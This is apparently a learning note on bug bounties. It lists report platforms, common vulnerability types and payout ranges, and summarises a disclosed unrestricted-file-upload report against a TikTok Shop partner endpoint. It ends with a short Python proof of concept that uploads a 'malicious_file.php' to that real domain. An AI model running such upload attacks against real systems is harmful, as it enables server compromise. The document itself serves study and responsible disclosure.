# Bug Bounties 

Bug bounty reports can be a great way to learn about vulnerabilities, exploit techniques, and responsible disclosure. Here are some resources where you can find bug bounty reports:

| Company             | URL                                                      | Description                                                                                             |
|---------------------|----------------------------------------------------------|---------------------------------------------------------------------------------------------------------|
| HackerOne           | https://hackerone.com/hacktivity                         | Public "Hacktivity" feed with disclosed vulnerability reports from various researchers.                 |
| Bugcrowd            | https://bugcrowd.com/programs                            | Bug bounty platform with individual programs, some of which may have disclosed reports available.       |
| Google VRP          | https://www.google.com/about/appsecurity/reward-program/ | Google Vulnerability Reward Program with a Hall of Fame and other resources containing bug reports.     |
| GitHub Security Lab | https://securitylab.github.com/research                  | Initiative by GitHub to help secure open source software, publishing security research and bug reports. |

The easiest or most common bugs submitted on bug bounty platforms like Bugcrowd and HackerOne often include the following:

- Cross-site Scripting (XSS): This vulnerability allows attackers to inject malicious scripts into web pages viewed by other users. It's prevalent due to the widespread use of JavaScript in web applications.

- Insecure Direct Object References (IDOR): IDOR occurs when an application exposes a reference to an internal implementation object, such as a database key, allowing unauthorized access to sensitive data.

- Cross-Site Request Forgery (CSRF): CSRF vulnerabilities allow attackers to trick users into performing actions they didn't intend to, such as changing their password or making a purchase.

- Information Disclosure: This category covers cases where sensitive data, such as server configurations or user data, is exposed unintentionally.

- Security Misconfiguration: These vulnerabilities arise when an application is improperly configured, leading to potential unauthorized access or data leaks.

- Broken Authentication: This category includes issues like weak password policies, insecure password storage, and session management flaws that can allow attackers to impersonate legitimate users.

The payouts for these vulnerabilities can vary widely depending on the platform, the specific bug, and the severity of its potential impact on the target application. For example, low-severity issues like reflected XSS or information disclosure might fetch rewards in the range of $100 to $500, while more severe vulnerabilities like stored XSS, IDOR, or broken authentication can earn bounties from $500 to a few thousand dollars.

It's essential to note that payouts are highly dependent on the specific program's rules and the vulnerability's impact. Some programs may have higher or lower payouts for specific vulnerability types.


## Reports

### Hackerone - File upload 01
> https://hackerone.com/reports/1890284
 
An unrestricted file upload vulnerability was found on a partner.tiktokshop.com endpoint, where if the content-type in the header was changed, any extension could be uploaded. We thank @h4x0r_dz for reporting this to our team.

An unrestricted file upload vulnerability was discovered on the partner.tiktokshop.com endpoint. This vulnerability allows an attacker to upload a file with any extension by changing the "Content-Type" header. This can potentially lead to the execution of malicious code on the server.

Here is a simple proof of concept (PoC) using Python to demonstrate this vulnerability:

```python
import requests

url = "https://partner.tiktokshop.com/upload_endpoint"  # Replace with the actual upload endpoint
file_path = "malicious_file.php"  # Replace with the path of your malicious file

with open(file_path, 'rb') as f:
    files = {'file': (file_path, f, 'application/octet-stream')}  # Use 'application/octet-stream' as the Content-Type
    response = requests.post(url, files=files)

print(response.text)
```